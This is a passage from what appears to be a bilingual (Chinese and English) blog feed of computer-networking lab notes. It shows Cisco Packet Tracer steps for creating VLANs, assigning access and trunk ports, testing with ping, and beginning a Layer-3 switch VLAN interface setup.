class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch#</span><br></pre></td></tr></table></figure>

<p>输入 show running-config 也可以查看目前接口配置情况，输入 show history 可以查看命令执行历史记录</p>
<h2 id="将接口划分到vlan"><a href="#将接口划分到vlan" class="headerlink" title="将接口划分到vlan"></a>将接口划分到vlan</h2><p>首先进入全局配置模式下，输入 configure terminal ，然后输入vlan 10创建新的vlan</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch#</span><br><span class="line">%SYS-<span class="number">5</span>-CONFIG_I: Configured <span class="keyword">from</span> <span class="built_in">console</span> by <span class="built_in">console</span></span><br><span class="line">configure terminal</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#vlan <span class="number">10</span></span><br><span class="line">Switch(config-vlan)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    </span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-vlan)#〔筆畫〕</span><br></pre></td></tr></table></figure>

<p>可以看到上面多了一个vlan 10</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config-vlan)# interface fastEthernet <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span>, Fa0/<span class="number">5</span></span><br><span class="line">                                                Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span>, Fa0/<span class="number">9</span></span><br><span class="line">                                                Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span>, Fa0/<span class="number">13</span></span><br><span class="line">                                                Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span>, Fa0/<span class="number">17</span></span><br><span class="line">                                                Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span>, Fa0/<span class="number">21</span></span><br><span class="line">                                                Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    Fa0/<span class="number">1</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%CDP-<span class="number">4</span>-NATIVE_VLAN_MISMATCH: Native VLAN mismatch discovered on FastEthernet0/<span class="number">1</span> (<span class="number">10</span>), <span class="keyword">with</span> Switch FastEthernet0/<span class="number">1</span> (<span class="number">1</span>).</span><br></pre></td></tr></table></figure>

<p>然后修改 0/24 端口，此处要修改端口模式</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#interface fastEthernet <span class="number">0</span>/<span class="number">24</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to up</span><br></pre></td></tr></table></figure>

<h2 id="更改PC的IP地址"><a href="#更改PC的IP地址" class="headerlink" title="更改PC的IP地址"></a>更改PC的IP地址</h2><p>各配置192.168.1.1(2)，关闭保存，打开Command Prompt，尝试互相ping</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=22ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=1ms TTL=<span class="number">128</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 22ms, Average = 5ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure>

<p>配置成功</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="输错指令进入域名解析"><a href="#输错指令进入域名解析" class="headerlink" title="输错指令进入域名解析"></a>输错指令进入域名解析</h2><p>按 Ctrl+Shift+6 快捷键取消操作</p>
<h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>First, let’s put two PCs and two switches(non-nintendo) in the Cisco Packet Tracer. The Cisco Packet Tracer can be downloaded <a href="https://www.netacad.com/zh-hans/courses/packet-tracer">here</a>. Then connect two PCs with their own switch by Copper Straight-Through Line. It is important to note that you should use Copper Cross-over Line to connect two switches. We use the switch model 2950-24 here. Connect FastEthernet 0/1 of the switch with the port of the PC, and then connect FastEthernet 0/24 of the two switches to each other.</p>
<h1 id="Configuration-of-Interface-and-VLAN"><a href="#Configuration-of-Interface-and-VLAN" class="headerlink" title="Configuration of Interface and VLAN"></a>Configuration of Interface and VLAN</h1><h2 id="View-the-information-about-VLAN"><a href="#View-the-information-about-VLAN" class="headerlink" title="View the information about VLAN"></a>View the information about VLAN</h2><p>Double Click one of the switches and switch to the tab of CLI. The default mode is User Mode. You should type “enable” to enter the privilege mode. You can type “show vlan” to view the situation of VLAN. By default, all interfaces are on vlan1.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch&gt;enable</span><br><span class="line">Switch#show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch#</span><br></pre></td></tr></table></figure>

<p>To view the information of the current interface, type “show running-config”. To view the history of command execution, type “show history”.</p>
<h2 id="Divide-the-interface-into-a-custom-vlan"><a href="#Divide-the-interface-into-a-custom-vlan" class="headerlink" title="Divide the interface into a custom vlan"></a>Divide the interface into a custom vlan</h2><p>First, type “configure terminal” to enter the global configuration mode. Then type “vlan 10” to create a new vlan. Type “do show vlan” after that, you will find an additional vlan.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch#</span><br><span class="line">%SYS-<span class="number">5</span>-CONFIG_I: Configured <span class="keyword">from</span> <span class="built_in">console</span> by <span class="built_in">console</span></span><br><span class="line">configure terminal</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#vlan <span class="number">10</span></span><br><span class="line">Switch(config-vlan)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    </span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-vlan)#〔筆畫〕</span><br><span class="line">Switch(config-vlan)# interface fastEthernet <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span>, Fa0/<span class="number">5</span></span><br><span class="line">                                                Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span>, Fa0/<span class="number">9</span></span><br><span class="line">                                                Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span>, Fa0/<span class="number">13</span></span><br><span class="line">                                                Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span>, Fa0/<span class="number">17</span></span><br><span class="line">                                                Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span>, Fa0/<span class="number">21</span></span><br><span class="line">                                                Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    Fa0/<span class="number">1</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%CDP-<span class="number">4</span>-NATIVE_VLAN_MISMATCH: Native VLAN mismatch discovered on FastEthernet0/<span class="number">1</span> (<span class="number">10</span>), <span class="keyword">with</span> Switch FastEthernet0/<span class="number">1</span> (<span class="number">1</span>).</span><br></pre></td></tr></table></figure>

<p>Then change the mode of fastEthernet 0/24 to trunk mode.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#interface fastEthernet <span class="number">0</span>/<span class="number">24</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to up</span><br></pre></td></tr></table></figure>

<h2 id="Set-IP-Address-for-PCs"><a href="#Set-IP-Address-for-PCs" class="headerlink" title="Set IP Address for PCs"></a>Set IP Address for PCs</h2><p>Set the IP of PC1 to 192.168.1.1, then set the IP of PC2 to 192.168.1.2. Then close the window to save the configuration. Open the Command Prompt. Try to ping PC2 from PC1. When you find a reply from PC2, you have done a good job.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\\&gt;ping <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=22ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=1ms TTL=<span class="number">128</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 22ms, Average = 5ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\\&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Other-Problem"><a href="#Other-Problem" class="headerlink" title="Other Problem"></a>Other Problem</h1><h2 id="Incorrectly-Entered-Command-and-Go-to-Resolving-Domain"><a href="#Incorrectly-Entered-Command-and-Go-to-Resolving-Domain" class="headerlink" title="Incorrectly Entered Command and Go to Resolving Domain"></a>Incorrectly Entered Command and Go to Resolving Domain</h2><p>Press Ctrl+Shift+6 to cancel the operation.</p>
<h1 id="At-the-End"><a href="#At-the-End" class="headerlink" title="At the End"></a>At the End</h1><p>From now on, I will try to use Chinese and English in each post. I want to improve my English by doing this. So if you find a mistake in the post, or even a grammatical mistake, please leave a message below the article. It is my pleasure to listen to your criticisms and suggestions!</p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>计算机网络原理</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络原理实验三──三层交换机基本配置</title>
    <url>/archives/Principles-Of-Computer-Networks-Experiment-3.html</url>
    <content><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>在 Switch 中拖入 3560-24PS ，放入两个PC机，并在Connections中选择Copper Straight-Through连接Switch的GigabitEthernet 0/1、0/2和两台PC机的FastEthernet 0。</p>
<span id="more"></span>

<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="划分vlan"><a href="#划分vlan" class="headerlink" title="划分vlan"></a>划分vlan</h2><p><strong>给vlan配置地址</strong></p>
<p>双击进入其中一台 Switch 中，为vlan10添加192.168.20.254地址</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch#en</span><br><span class="line">Switch#conf </span><br><span class="line">Configuring <span class="keyword">from</span> terminal, memory, or network [terminal]? </span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#interface vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface Vlan10, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no sh</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<p>添加出错后，可为vlan10删除该地址</p>
